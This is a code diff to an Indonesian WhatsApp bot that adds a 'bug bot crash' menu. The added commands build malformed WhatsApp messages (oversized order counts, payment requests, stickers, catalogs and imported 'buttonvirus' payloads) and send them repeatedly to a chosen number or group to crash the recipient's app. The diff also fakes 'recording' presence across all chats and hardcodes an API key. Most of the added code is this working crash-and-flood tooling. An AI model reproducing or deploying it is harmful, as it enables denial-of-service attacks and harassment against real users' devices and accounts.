@@ -43,6 +43,9 @@ const moment = require("moment-timezone");
 const ameClient = require("amethyste-api")
 const ameApi = new ameClient("1f486b04b157f12adf0b1fe0bd83c92a28ce768683871d2a390e25614150d0c8fa404fd01b82a5ebf5b82cbfa22e365e611c8501225a93d5d1e87f9f420eb91b")
 const hx = require('hxz-api');
+const { philips } = require('./lib/philips.js');
+const { vapi } = require('./lib/vapi.js'); 
+const { buttonvirus } = require('./lib/buttonvirus.js'); 
 const { performance } = require('perf_hooks')
 const zee = require('xfarr-api')
 
@@ -61,6 +64,7 @@ const db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'
 
 pp_bot = fs.readFileSync(thumbnail)
 qris = fs.readFileSync(donasi)
+vn = true
 moment.tz.setDefault("Asia/Jakarta").locale("id");
 
 // Database Game
@@ -99,6 +103,7 @@ module.exports = alpha = async (alpha, m, chatUpdate, store, reSize) => {
         const isCreator = [alpha.user.id, ...global.owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender)
         const itsMe = m.sender == alpha.user.id ? true : false
         const text = q = args.join(" ")
+        const qtod = m.quoted? "true":"false"
         const c = args.join(' ')
         const quoted = m.quoted ? m.quoted : m
         const mime = (quoted.msg || quoted).mimetype || ''
@@ -133,9 +138,129 @@ module.exports = alpha = async (alpha, m, chatUpdate, store, reSize) => {
 		const floc = {key : {participant : '0@s.whatsapp.net'},message: {locationMessage: {name: `${ownername}`,jpegThumbnail: pp_bot}}}
 		const fkontak = { key: {participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `6283136505591-1614953337@g.us` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': pp_bot, thumbnail: pp_bot,sendEphemeral: true}}}
 		let picaks = [flaming,fluming,flarun,flasmurf]
+		const turbrek = `break`
 		let picak = picaks[Math.floor(Math.random() * picaks.length)]
 		
-		
+				//FAKEBUG
+const fbugtroli = {
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+            "orderMessage": {
+                        "orderId": "3184312811796096",
+						"sellerJid": "0@s.whatsapp.net",
+						"itemCount": 7777777,
+						"status": 7,
+						"surface": 7,
+						"message": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ`,
+						"orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
+						"thumbnail": pp_bot,
+                        "token": "AR6ew8v8oH4gt78Ufm/sMBCeaQJwJlDhOTto8qAZytAdQA=="
+        }
+        }
+        }
+        const fpayment = {
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, ...(from ? 
+            { remoteJid: "6289523258649-1604595598@g.us" } : {}) 
+        }, 
+        message: { 
+"requestPaymentMessage": {
+"currencyCodeIso4217": "INR",
+"amount1000": "9999999999",
+"requestPaymentimage": pp_bot,
+"requestFrom": `6282134110253@s.whatsapp.net`,
+"noteMessage": {
+"extendedTextMessage": {
+"text": `© ${ownername}`
+}
+}
+}
+}
+}
+const fbugpayment = {
+        key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+"requestPaymentMessage": {
+"currencyCodeIso4217": "INR",
+"amount1000": "9999999999",
+"requestPaymentimage": pp_bot,
+"requestFrom": `6282134110253@s.whatsapp.net`,
+"noteMessage": {
+"extendedTextMessage": {
+"text": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ`
+}
+}
+}
+}
+}
+		const fbugstik = {
+key: { 
+            fromMe: false, 
+            participant: `0@s.whatsapp.net`, 
+            ...({ remoteJid: "" }) 
+        }, 
+        message: { 
+"stickerMessage": {
+"url": "https://mmg.whatsapp.net/d/f/AnrD-A1QmqzujA1cup-mlu8IZA25t9JgmpQepFY9Rn6z.enc'",
+"fileSha256": "YEkt1kHkOx7vfb57mhnFsiu6ksRDxNzRBAxqZ5O461U=",
+"fileEncSha256": "9ryK8ZNEb3k3CXA0X89UjCiaHAoovwYoX7Ml1tzDRl8=",
+"mediaKey": "nY85saH7JH45mqINzocyAWSszwHqJFm0M0NvL7eyIDM=",
+"mimetype": "image/webp",
+"height": 90000,
+"width": 90000,
+"directPath": "/v/t62.15575-24/30929805_648615486894459_9146693700573396349_n.enc?ccb=11-4&oh=01_AVwP9-aotKL3M5xo84ruYmFJof6hpjvTaHtWrOLdvzhkxw&oe=632E77C8",
+"fileLength": "90000",
+"mediaKeyTimestamp": "1657290167",
+"isAnimated": false,
+}
+}
+}
+//===================SHINCHAN XD=========================//
+if (vn) {
+const allct = await store.chats.all().map(v => v.id)
+if (m.message && m) {
+if (vn === false) return
+for (let jid of allct) {
+alpha.sendPresenceUpdate('recording', jid)
+setTimeout(() => {
+alpha.sendPresenceUpdate('recording', jid)
+}, 25000)
+setTimeout(() => {
+alpha.sendPresenceUpdate('recording', jid)
+}, 50000)
+setTimeout(() => {
+alpha.sendPresenceUpdate('recording', jid)
+}, 75000)
+setTimeout(() => {
+alpha.sendPresenceUpdate('recording', jid)
+}, 95000)
+}
+}
+}
+//===================SHINCHAN XD=========================//	
+const paytod = (teks) => {
+var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"requestPaymentMessage": {
+"currencyCodeIso4217": "INR",
+"amount1000": "10000000000",
+"requestPaymentimage": pp_bot,
+"requestFrom": "6282134110253@s.whatsapp.net",
+"noteMessage": {
+"extendedTextMessage": {
+"text": `${teks}`,
+}
+}}}), { userJid: m.chat, quoted: ftroli })
+alpha.relayMessage(m.chat, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}
 		const reply = async (teks) => {
 			return await alpha.sendFakeLink(m.chat,teks,salam, pushname,ownername, thumbnail, myweb, m)
 		}
@@ -157,14 +282,14 @@ if (!user) continue
 let afkTime = user.afkTime
 if (!afkTime || afkTime < 0) continue
 let reason = user.afkReason || ''
-reply(`Jangan tag dia!
+paytod(`Jangan tag dia!
 Dia sedang AFK ${reason ? '\nReason : ' + reason : 'Reason : Nothing'}
 Waktu : ${clockString(new Date - afkTime)}
 `.trim())
 }
 if (db.data.users[m.sender].afkTime > -1) {
 let user = db.data.users[m.sender]
-m.reply(`
+paytod(`
 Kamu berhenti AFK${user.afkReason ? ' setelah ' + user.afkReason : ''}
 Selama ${clockString(new Date - user.afkTime)}
 `.trim())
@@ -1175,8 +1300,72 @@ alpha.sendMessage(m.chat, {image: {url: ppnu}, caption: indonesia.profile(userna
 				db.data.users[m.sender].limit -= 1
             }
             break
-            case 'ping': case 'tes': case 'runtime':
+            case 'tes': case 'runtime':
             reply(`Runtime : ${runtime(process.uptime())}`)
+            break
+case 'ping': case 'botstatus': case 'statusbot': {
+                const used = process.memoryUsage()
+                const cpus = os.cpus().map(cpu => {
+                    cpu.total = Object.keys(cpu.times).reduce((last, type) => last + cpu.times[type], 0)
+			        return cpu
+                })
+                const cpu = cpus.reduce((last, cpu, _, { length }) => {
+                    last.total += cpu.total
+                    last.speed += cpu.speed / length
+                    last.times.user += cpu.times.user
+                    last.times.nice += cpu.times.nice
+                    last.times.sys += cpu.times.sys
+                    last.times.idle += cpu.times.idle
+                    last.times.irq += cpu.times.irq
+                    return last
+                }, {
+                    speed: 0,
+                    total: 0,
+                    times: {
+			            user: 0,
+			            nice: 0,
+			            sys: 0,
+			            idle: 0,
+			            irq: 0
+                }
+                })
+                let timestamp = speed()
+                let latensi = speed() - timestamp
+                neww = performance.now()
+                oldd = performance.now()
+                respon = `
+Response Speed ${latensi.toFixed(4)} _Second_ \n ${oldd - neww} _miliseconds_\n\nRuntime : ${runtime(process.uptime())}
+
+💻 Info Server
+RAM: ${formatp(os.totalmem() - os.freemem())} / ${formatp(os.totalmem())}
+
+_🔥NodeJS Memory Usaage🔥_
+${Object.keys(used).map((key, _, arr) => `${key.padEnd(Math.max(...arr.map(v=>v.length)),' ')}: ${formatp(used[key])}`).join('\n')}
+
+${cpus[0] ? `_Total CPU Usage_
+${cpus[0].model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}
+_CPU Core(s) Usage (${cpus.length} Core CPU)_
+${cpus.map((cpu, i) => `${i + 1}. ${cpu.model.trim()} (${cpu.speed} MHZ)\n${Object.keys(cpu.times).map(type => `- *${(type + '*').padEnd(6)}: ${(100 * cpu.times[type] / cpu.total).toFixed(2)}%`).join('\n')}`).join('\n\n')}` : ''}
+                `.trim()
+                paytod(respon)
+            }
+            break
+case 'speedtest': {
+            paytod('Testing Speed...')
+            let cp = require('child_process')
+            let { promisify } = require('util')
+            let exec = promisify(cp.exec).bind(cp)
+          let o
+          try {
+          o = await exec('python speed.py')
+          } catch (e) {
+          o = e
+         } finally {
+        let { stdout, stderr } = o
+        if (stdout.trim()) paytod(stdout)
+        if (stderr.trim()) paytod(stderr)
+            }
+            }
             break
             case 'public': {
                 if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
@@ -1190,6 +1379,584 @@ alpha.sendMessage(m.chat, {image: {url: ppnu}, caption: indonesia.profile(userna
                 reply(lang.BotSelf())
             }
             break
+case 'resetlinkgc':
+case 'resetlinkgroup':
+case 'resetlinkgrup':
+case 'revoke':
+case 'resetlink':
+case 'resetgrouplink':
+case 'resetgclink':
+case 'resetgruplink': {
+if (!m.isGroup) return reply(lang.groupOnly())
+if (!isGroupAdmins && !isGroupOwner && !isCreator) return reply(lang.adminOnly())
+alpha.groupRevokeInvite(m.chat)
+}
+break
+case 'getcase': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+if (!args[0]) return paytod("Mau ngambil case apa?")
+try {
+paytod(`// Created By ShinChan Senpai\n` + 'case ' + `'${args[0]}'` + fs.readFileSync('./index.js').toString().split(`case '${args[0]}'`)[1].split(turbrek)[0] + turbrek)
+} catch {
+paytod("Case Tidak Ditemukan")
+}
+}
+break
+case 'toviewonce': case 'toonce': { 
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+        if (!quoted) return paytod(`Reply image`)
+        if (/image/.test(mime)) {
+anu = await alpha.downloadAndSaveMediaMessage(quoted)
+alpha.sendMessage(m.chat, {image: {url: anu},viewOnce : true},{quoted: ftroli })
+        } else if (/video/.test(mime)) {
+        anu = await alpha.downloadAndSaveMediaMessage(quoted)
+        alpha.sendMessage(m.chat, {video: {url: anu},viewOnce : true},{quoted: ftroli })
+        }
+        }
+        break
+        case 'repeat':       
+if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+var shinchan_kawaii = `${args.join(' ')}`
+var kata = shinchan_kawaii.split("|")[0];
+var angka = shinchan_kawaii.split("|")[1]
+let meme = `${kata}`.repeat(angka)
+await alpha.sendMessage(m.chat, { text: `${meme}` }, { quoted: ftroli })
+break
+//===================MENU BUG BOT=========================//
+case 'jadikatalog': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+let media = await quoted.download()
+paytod(lang.wait())
+var messa = await prepareWAMessageMedia({ image: media }, { upload: alpha.waUploadToServer })
+var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"productMessage": {
+"product": {
+"productImage": messa.imageMessage,
+"productId": "",
+"jpegThumbnail": pp_bot,
+"title": `${text} ${philips}`,
+"description": `${text} ${vapi()}`,
+"productImageCount": 999999999,
+"firstImageId": 1,
+"retailerId": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕`,
+"bodyText": `${text}`,
+"footerText": `${text}`,
+"url": "https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ"
+},
+"businessOwnerJid": "6282134110253@s.whatsapp.net",
+"contextInfo": {
+"forwardingScore": 150,
+"isForwarded": true
+}
+}
+}), { userJid: m.chat, quoted: fbugpayment })
+alpha.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
+}
+break
+case 'mentahankatalog': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+let media = await quoted.download()
+paytod(lang.wait())
+var messa = await prepareWAMessageMedia({ image: media }, { upload: alpha.waUploadToServer })
+var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"productMessage": {
+"product": {
+"productImage": messa.imageMessage,
+"productId": "",
+"jpegThumbnail": pp_bot,
+"title": `${text}`,
+"description": `${text}`,
+"productImageCount": 999999999,
+"firstImageId": 1,
+"retailerId": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕`,
+"bodyText": `${text}`,
+"footerText": `${text}`,
+"url": "https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ"
+},
+"businessOwnerJid": "6282134110253@s.whatsapp.net",
+"contextInfo": {
+"forwardingScore": 150,
+"isForwarded": true
+}
+}
+}), { userJid: m.chat, quoted: fpayment })
+alpha.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
+}
+break
+case 'jadikatalog2': {
+ if (!m.key.fromMe && !isCreator) throw sticOwner(from)
+let media = await quoted.download()
+let teksanu = text.split("|")[0]
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+var messa = await prepareWAMessageMedia({ image: media }, { upload: alpha.waUploadToServer })
+for (let i = 0; i < jumlah ; i++){
+var catalog = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
+"productMessage": {
+"product": {
+"productImage": messa.imageMessage,
+"productId": "",
+"jpegThumbnail": pp_bot,
+"title": `${teksanu} ${philips}`,
+"description": `${teksanu} ${vapi()}`,
+"productImageCount": 999999999,
+"firstImageId": 1,
+"retailerId": `〔 ıll ☄︎ ⫹⫺ ᴺᵉʳᵒ☃︎ˢᵉⁿᵖᵃⁱ 浤 ☄︎ llı 〕`,
+"bodyText": `ShinChan XD`,
+"footerText": `SHINCHAN XD`,
+"url": "https://youtube.com/channel/UCqCZmaSvnbsre9EKEyGtviQ"
+},
+"businessOwnerJid": "6282134110253@s.whatsapp.net",
+"contextInfo": {
+"forwardingScore": 150,
+"isForwarded": true
+}
+}
+}), { userJid: m.chat, quoted: fbugtroli })
+alpha.relayMessage(m.chat, catalog.message, { messageId: catalog.key.id })
+await sleep(60* secon)
+}
+}
+break
+case 'p':
+alpha.sendMessage(from, { delete: {
+  remoteJid: from,
+  id: m.quoted.id,
+  fromMe: m.quoted.fromMe,
+  participant: ''
+}})
+let reactionMessage = proto.Message.ReactionMessage.create({ key: m.key, text: "ShinChan SENPAI" })
+alpha.relayMessage(from, { reactionMessage }, { messageId: "abcd" })
+break
+//===================BUG BOT CRASH=========================//
+case 'sendbug' : {
+ if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+if(!text) return reply(`masukan seperti ini ${prefix+command} nomor | jumlah`)
+
+let memek = text.split("|")[0]+'@s.whatsapp.net'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+a = await paytod(`Succes send bug Quoted Ke ${nomor} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
+for (let i = 0; i < jumlah ; i++){
+await alpha.sendMessage(nomor, {text: `⫹⫺ ${nomor} CRASH`},{quoted:fbugtroli})
+await sleep(60* secon)
+}
+}
+break
+case 'shinpay': {
+ if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+let memek = text.split("|")[0]+'@s.whatsapp.net'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+a = await paytod(`Succes send bug Payment Ke ${nomor} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
+for (let i = 0; i < jumlah ; i++){
+alpha.relayMessage(nomor, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡʜᴀᴛꜱᴀᴩᴩ`, currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: pp_bot }}}}, { quoted : fbugtroli })
+await sleep(60* secon)
+}
+}
+break
+case 'sendbugnew': {
+ if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+mm = text.split("|")[0]+'@s.whatsapp.net'
+jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+a = await paytod(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
+for (let i = 0; i < jumlah ; i++){
+await alpha.sendMessage(mm, { 
+text: '⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³', 
+templateButtons: [
+{ callButton: { displayText: `OWNER`, phoneNumber: `6282134110253`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6282134110253`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6282134110253`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6282134110253`}},
+{ urlButton: { displayText: `GROUP SHINCHAN`, url: `https://chat.whatsapp.com/J4vxirLBZ5K7hKZWe0Vm8q`}},
+{ urlButton: { displayText: `GROUP SHINCHAN`, url: `https://chat.whatsapp.com/J4vxirLBZ5K7hKZWe0Vm8q`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN XD`, id: `⫹⫺ ʙᴜɢ ɴᴇᴡ ᴇʀᴀ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN XD`, id: `⫹⫺ ʙᴜɢ ɴᴇᴡ ᴇʀᴀ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN XD`, id: `⫹⫺ ʙᴜɢ ɴᴇᴡ ᴇʀᴀ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN XD`, id: `⫹⫺ ʙᴜɢ ɴᴇᴡ ᴇʀᴀ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN GANTENG`, id: `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ`}},
+]
+ })
+ await sleep(60* secon)
+}
+}
+break
+case 'sendbugnewgc': {
+ if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+mm = text.split("|")[0]+'@g.us'
+jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+a = await paytod(`Succes send bug "CRASH🐼" Ke ${mm} Sebanyak ${jumlah} kali dalam waktu ${secon} detik`)
+for (let i = 0; i < jumlah ; i++){
+await alpha.sendMessage(mm, { 
+text: '⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³', 
+templateButtons: [
+{ callButton: { displayText: `OWNER`, phoneNumber: `6282134110253`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6282134110253`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6282134110253`}},
+{ callButton: { displayText: `OWNER`, phoneNumber: `6282134110253`}},
+{ urlButton: { displayText: `GROUP SHINCHAN`, url: `https://chat.whatsapp.com/J4vxirLBZ5K7hKZWe0Vm8q`}},
+{ urlButton: { displayText: `GROUP SHINCHAN`, url: `https://chat.whatsapp.com/J4vxirLBZ5K7hKZWe0Vm8q`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `CRASH WHATSAPP`, id: `⫹⫺ ꜱʜɪɴᴄʜᴀɴ ɪɴᴠɪꜱɪʙʟᴇ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN XD`, id: `⫹⫺ ʙᴜɢ ɴᴇᴡ ᴇʀᴀ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN XD`, id: `⫹⫺ ʙᴜɢ ɴᴇᴡ ᴇʀᴀ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN XD`, id: `⫹⫺ ʙᴜɢ ɴᴇᴡ ᴇʀᴀ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN XD`, id: `⫹⫺ ʙᴜɢ ɴᴇᴡ ᴇʀᴀ ²⁰²²/²⁰²³`}},
+{ quickReplyButton: { displayText: `SHINCHAN GANTENG`, id: `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ`}},
+]
+ })
+ await sleep(60* secon)
+}
+}
+break
+case 'shinpaygc': {
+ if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+num = q.split('|')[0]+'@g.us'
+jumlah = q.split('|')[1]
+let secon = text.split("|")[2]
+a = await paytod(`Succes send bug Payment Ke ${num} Sebanyak ${jumlah} kali dengan waktu ${secon} detik`)
+for (let i = 0; i < jumlah; i++) {
+alpha.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡʜᴀᴛꜱᴀᴩᴩ`, currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: pp_bot }}}}, { quoted : fbugtroli })
+await sleep(3000)
+alpha.relayMessage(num, { requestPaymentMessage: { Message: { extendedTextMessage: { text: `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡʜᴀᴛꜱᴀᴩᴩ`, currencyCodeIso4217: 'USD', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: pp_bot }}}}, { quoted : fbugtroli })
+await sleep(60* secon)
+}
+}
+break
+case 'sendbugpoll': {
+ if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+let memek = text.split("|")[0]+'@s.whatsapp.net'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+a = await paytod(`Succes send bug Polling Ke ${nomor} Sebanyak ${jumlah} kali dengan waktu ${secon} detik`)
+for (let i = 0; i < jumlah ; i++){
+var pollCreation = generateWAMessageFromContent(nomor, proto.Message.fromObject({
+"pollCreationMessage": {
+"name": "Assalamualaikum💖🐼",
+"options": [
+	{
+"optionName": "Waalaikumsalam🐼"
+	},
+	{
+"optionName": "Iya Waalaikumsalam 😏"
+	}
+],
+"selectableOptionsCount": 2
+	}
+}), { userJid: m.chat, quoted: fbugtroli })
+alpha.relayMessage(nomor, pollCreation.message, { messageId: pollCreation.key.id })
+await sleep(60* secon)
+}
+}
+break
+case 'sendbugpollgc': {
+ if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+let memek = text.split("|")[0]+'@g.us'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+a = await paytod(`Succes send bug Polling Ke ${nomor} Sebanyak ${jumlah} kali dengan waktu ${secon} detik`)
+for (let i = 0; i < jumlah ; i++){
+var pollCreation = generateWAMessageFromContent(nomor, proto.Message.fromObject({
+"pollCreationMessage": {
+"name": "Assalamualaikum💖🐼",
+"options": [
+	{
+"optionName": "Waalaikumsalam🐼"
+	},
+	{
+"optionName": "Iya Waalaikumsalam 😏"
+	}
+],
+"selectableOptionsCount": 2
+	}
+}), { userJid: m.chat, quoted: fbugtroli })
+alpha.relayMessage(nomor, pollCreation.message, { messageId: pollCreation.key.id })
+await sleep(60* secon)
+}
+}
+break
+case 'sendbugaudio': {
+ if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+let memek = text.split("|")[0]+'@s.whatsapp.net'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+a = await paytod(`Succes send bug Audio Ke ${nomor} Sebanyak ${jumlah} kali dengan waktu ${secon} detik`)
+for (let i = 0; i < jumlah ; i++){
+var audio = generateWAMessageFromContent(nomor, proto.Message.fromObject({
+"audioMessage": {
+						"url": "https://mmg.whatsapp.net/d/f/AtvXn5Bb76rR9uYiXjBd0u5py_aKLhNmP2rhruiO184w.enc",
+						"mimetype": "audio/mpeg",
+						"fileSha256": "xRdNvEI+QPro9BTPTCqr8MCBQnHXSPwd+8pIr11jEEA=",
+						"fileLength": "508866",
+						"seconds": 11,
+						"ptt": false,
+						"mediaKey": "3mpwldA7aDzUyupv+VxiVJuyIprx4ViIld03qSEO9Z4=",
+						"fileEncSha256": "iS7SrciqKZ0O/2vMz1DVYpjxurXmCGsDS9d8vtYQKjA=",
+						"directPath": "/v/t62.7114-24/40814954_658794068999726_27489807458198261_n.enc?ccb=11-4&oh=01_AVz6VQtXvHU48YtDIMnKJCETu_Rgte-RQV8eriztjlFAMQ&oe=6358CE0B",
+						"mediaKeyTimestamp": "1664359148"
+}
+}), { userJid: m.chat, quoted: fbugtroli })
+alpha.relayMessage(nomor, audio.message, { messageId: audio.key.id })
+await sleep(60* secon)
+}
+}
+break
+case 'sendbugaudiogc': {
+ if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+let memek = text.split("|")[0]+'@g.us'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+a = await paytod(`Succes send bug Audio Ke ${nomor} Sebanyak ${jumlah} kali dengan waktu ${secon} detik`)
+for (let i = 0; i < jumlah ; i++){
+var audio = generateWAMessageFromContent(nomor, proto.Message.fromObject({
+"audioMessage": {
+						"url": "https://mmg.whatsapp.net/d/f/AtvXn5Bb76rR9uYiXjBd0u5py_aKLhNmP2rhruiO184w.enc",
+						"mimetype": "audio/mpeg",
+						"fileSha256": "xRdNvEI+QPro9BTPTCqr8MCBQnHXSPwd+8pIr11jEEA=",
+						"fileLength": "508866",
+						"seconds": 11,
+						"ptt": false,
+						"mediaKey": "3mpwldA7aDzUyupv+VxiVJuyIprx4ViIld03qSEO9Z4=",
+						"fileEncSha256": "iS7SrciqKZ0O/2vMz1DVYpjxurXmCGsDS9d8vtYQKjA=",
+						"directPath": "/v/t62.7114-24/40814954_658794068999726_27489807458198261_n.enc?ccb=11-4&oh=01_AVz6VQtXvHU48YtDIMnKJCETu_Rgte-RQV8eriztjlFAMQ&oe=6358CE0B",
+						"mediaKeyTimestamp": "1664359148"
+}
+}), { userJid: m.chat, quoted: fbugtroli })
+alpha.relayMessage(nomor, audio.message, { messageId: audio.key.id })
+await sleep(60* secon)
+}
+}
+break
+case 'sendbugtroli': {
+ if (!m.key.fromMe && !isCreator) return reply(lang.ownerOnly())
+let memek = text.split("|")[0]+'@s.whatsapp.net'
+let nomor = memek.replace(" ", "")
+let jumlah = text.split("|")[1]
+let secon = text.split("|")[2]
+a = await paytod(`Succes send bug Troli Ke ${nomor} Sebanyak ${jumlah} kali dengan waktu ${secon} detik`)
+for (let i = 0; i < jumlah ; i++){
+var troli = generateWAMessageFromContent(nomor, proto.Message.fromObject({
+"orderMessage": {
+                  "sellerJid": "6282134110253@s.whatsapp.net",
+                  "itemCount": 7777777,
+                  "message": `⫹⫺ sʜɪɴᴄʜᴀɴ-ɪɴꜰɪɴɪᴛʏ-ᴄʀᴀꜱʜ-ᴡᴀ`,
+                  "orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
+                  "thumbnail": fs.readFileSync("./image/virgam.jpeg")
+}
+}), { userJid: m.chat, quoted: fbugtroli })
